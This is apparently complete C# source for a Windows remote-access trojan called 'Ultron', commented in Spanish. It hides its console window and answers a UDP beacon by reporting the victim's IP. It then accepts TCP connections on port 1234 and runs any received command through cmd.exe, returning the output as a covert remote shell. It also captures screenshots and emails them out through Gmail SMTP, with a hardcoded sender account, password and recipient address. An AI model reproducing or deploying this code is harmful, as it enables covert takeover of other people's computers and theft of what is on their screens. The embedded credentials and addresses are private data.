using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Net.Mail;
using System.Drawing;
using System.Windows.Forms;
using System.IO;

namespace Ultron1._0
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SH_HIDE = 0;
        const int SW_SHOW = 5;
        static string ipAtacante = string.Empty;
        public static string dr = Directory.GetCurrentDirectory() + Path.DirectorySeparatorChar;
      //  public static string comandoss;

        static void Main(string[] args)
        {
            //Se oculta la ventana
            var handle = GetConsoleWindow();
            ShowWindow(handle,SH_HIDE);
            //proceso de consola
            while (true)
            {
                ConexionUDP();
                ConexionTCP();
            }
        }

        static void ConexionTCP()
        {
            bool bandera = true;
            Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPEndPoint ep = new IPEndPoint(IPAddress.Any, 1234);
            try
            {
                Console.WriteLine("Esperando Conexion...");
                serverSocket.Bind(ep);
                serverSocket.Listen(10);
                Socket escuchadorSocket = serverSocket.Accept();
                Console.WriteLine("Conexion Establecida");
                Byte[] datos;
                string cadena = string.Empty;
                while (bandera)
                {
                    datos = new Byte[2048];
                    int byteRec = escuchadorSocket.Receive(datos);
                    cadena = Encoding.ASCII.GetString(datos, 0, byteRec);

                    Console.WriteLine("RUTA:{0} ", dr);
                    
                    if (cadena == "exit")
                    {
                        bandera = false;
                        break;
                    }
                    else
                    {

                        //cadena


                        if (cadena == "cd..")
                        {

                            dr = pat();
                            Console.WriteLine("New path={0}", dr);
                        }


                        if (cortac(cadena, 1) == "cd")
                        {
                            if (Directory.Exists(dr + cortac(cadena, 2)))
                            {
                                dr = dr + cortac(cadena, 2) + Path.DirectorySeparatorChar;
                                Console.WriteLine("directorio si existe {0}", dr);

                            }
                            else
                            {
                                if (Directory.Exists(cortac(cadena, 2)))
                                    dr = cortac(cadena, 2) + Path.DirectorySeparatorChar;
                                else
                                    Console.WriteLine("directorio no existe");
                            }
                        }
                       // Console.WriteLine("directorio cortado.... = {0}", cortapp(dr));


                        //
                      
                        string informacion = ExecuteCommandSync(cadena); 
                        if (informacion == null || informacion == "")
                        {
                            informacion = "null";
                        }

                        Byte[] respuesta = Encoding.ASCII.GetBytes(informacion);
                        escuchadorSocket.Send(Encoding.ASCII.GetBytes(respuesta.Length.ToString()));

                        
                        //Console.WriteLine("tamano"+respuesta.Length);
                        escuchadorSocket.Send(respuesta);
                    }
                }
                escuchadorSocket.Close();
            }
            catch (Exception e)
            {
                Console.WriteLine("error:" + e);
            }
            serverSocket.Close();
        }


       
        public static string ExecuteCommandSync(object command)
        {
            try
            {
                Console.WriteLine(command);
                switch (command.ToString())
                {
                    case "pantalla":
                        return ImprimirPantalla();
                    case "correo":
                        return EnviarEmail();                   
                }
                System.Diagnostics.ProcessStartInfo procStartInfo =
                    new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);

                // The following commands are needed to redirect the standard output.
                // This means that it will be redirected to the Process.StandardOutput StreamReader.
                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                //directorio que se esta trabajando
                procStartInfo.WorkingDirectory = dr; 
                // Do not create the black window.
                procStartInfo.CreateNoWindow = true;
                // Now we create a process, assign its ProcessStartInfo and start it
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                // Get the output into a string
                string result = proc.StandardOutput.ReadToEnd();
                Console.WriteLine(result);
                //return "Test";
                // Display the command output.
                return result;
            }
            catch (Exception objException)
            {
                // Log the exception
                Console.WriteLine("Error {0}", objException);
                return objException.Message;
            }
        }
         
   
       


        public static bool SocketAbierto(Socket s)
        {
            bool part1 = s.Poll(1000, SelectMode.SelectRead);
            bool part2 = (s.Available == 0);

            if (part1 && part2)
                return false;
            else
                return true;
        }
        static void ConexionUDP()
        {
            UdpClient udpServer = new UdpClient(15000);
            bool bandera = true;
            while (bandera)
            {
                var remoteEP = new IPEndPoint(IPAddress.Any, 15000);
                Console.WriteLine("Esperando paquetes del cliente");
                byte[] data = udpServer.Receive(ref remoteEP);
                string comando = Encoding.ASCII.GetString(data, 0, data.Length);
                if (comando.Contains(','))
                {
                    String[] datos = comando.Split(',');

                    comando = datos[0];
                    ipAtacante = datos[1];
                    if (comando == "hackinng")
                    {
                        Console.WriteLine("conectado...enviado");
                        string cadena = LocalIPAddress();
                        byte[] dataSend = Encoding.ASCII.GetBytes(cadena);
                        udpServer.Send(dataSend, dataSend.Length, remoteEP);
                        udpServer.Close();
                        bandera = false;
                    }
                }
            }
        }


        static string LocalIPAddress()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        static string ImprimirPantalla()
        {
            try
            {
                int wid = Screen.GetBounds(new Point(0, 0)).Width; // Declaramos el int wid para calcular el tamaño de la pantalla
                int he = Screen.GetBounds(new Point(0, 0)).Height; // Declaramos el int he para calcular el tamaño de la pantalla
                Bitmap now = new Bitmap(wid, he); // Declaramos now como Bitmap con los tamaños de la pantalla
                Graphics grafico = Graphics.FromImage((Image)now); // Declaramos grafico como Graphics usando el declarado now 
                grafico.CopyFromScreen(0, 0, 0, 0, new Size(wid, he)); // Copiamos el screenshot con los tamaños de la pantalla 
                // usando "grafico"
                now.Save("archivo.jpg");

                return "impresion pantalla correcta";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }

        }

        static string EnviarEmail()
        {
            try
            {
                Attachment archivo = new Attachment("archivo.jpg");
                MailMessage msg = new MailMessage();
                msg.To.Add("aquinoaldair@hotmail.com");
                msg.From = new MailAddress("ultronn.msicu@gmail.com", "Ultronn", System.Text.Encoding.UTF8);
                msg.Subject = "Fecha: " + DateTime.Now.Date.ToString();
                msg.Attachments.Add(archivo);
                msg.SubjectEncoding = System.Text.Encoding.UTF8;
                msg.Body = "";
                msg.BodyEncoding = System.Text.Encoding.UTF8;
                msg.IsBodyHtml = false; //Si vas a enviar un correo con contenido html entonces cambia el valor a true
                //Aquí es donde se hace lo especial 
                SmtpClient client = new SmtpClient();
                client.Credentials = new System.Net.NetworkCredential("ultronn.msicu@gmail.com", "Ultron123456");
                client.Port = 587;
                client.Host = "smtp.gmail.com";//Este es el smtp valido para Gmail 
                client.EnableSsl = true; //Esto es para que vaya a través de SSL que es obligatorio con GMail             
                client.Send(msg);
                return "correo enviado satisfaccioriamente";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
        //funciones CMD
        public static string cortac(string cad, int n)
        {
            int cont = 1;
            char[] delimiterChars = { ' ' };
            string[] words = cad.Split(delimiterChars);

            foreach (string s in words)
            {
                if (n == cont)
                    return s;
                cont = cont + 1;
            }
            return "";
        }
        public static string corta(string cad)
        {

            char[] delimiterChars = { Path.PathSeparator };
            string[] words = cad.Split(delimiterChars);

            foreach (string s in words)
            {

                return s;

            }
            return cad;
        }
        public static string cortapp(string cad)
        {

            char[] delimiterChars = { Path.DirectorySeparatorChar };
            string[] words = cad.Split(delimiterChars);

            int cont = 0;
            for (int i = 0; i < cad.Length; i++)
            {
                if (cad[i] == Path.DirectorySeparatorChar)
                {
                    cont = cont + 1;
                }
            }

            int j = 0; string aux = "";
            foreach (string s in words)
            {

                if (j == cont - 1)
                    return aux;

                aux = s + Path.DirectorySeparatorChar + aux;
                j = j + 1;

            }
            return cad;
        }

        public static string pat()
        {
            ////string cut pad
            string item = @dr;


            Console.WriteLine("ITEM IN PATH ={0}", item);
            // string directory2 = item.Split(Path.DirectorySeparatorChar).GetValue((item.Split(Path.DirectorySeparatorChar).Length - 4)).ToString();
            ///
            int ccont = 0;
            string directory2 = "";
            //= item.Split(Path.DirectorySeparatorChar).GetValue((item.Split(Path.DirectorySeparatorChar).Length - 4)).ToString();

            while (ccont <= item.Split(Path.DirectorySeparatorChar).Length - 3)
            {
                if (ccont != 0)
                    directory2 = directory2 + Path.DirectorySeparatorChar + (item.Split(Path.DirectorySeparatorChar).GetValue((ccont)).ToString());
                else if (directory2 != "")
                    directory2 = directory2 + (item.Split(Path.DirectorySeparatorChar).GetValue((ccont)).ToString());

                ccont++;
            }

            directory2 = directory2 + Path.DirectorySeparatorChar;
            return directory2;
            ///
        }
    



    }
}
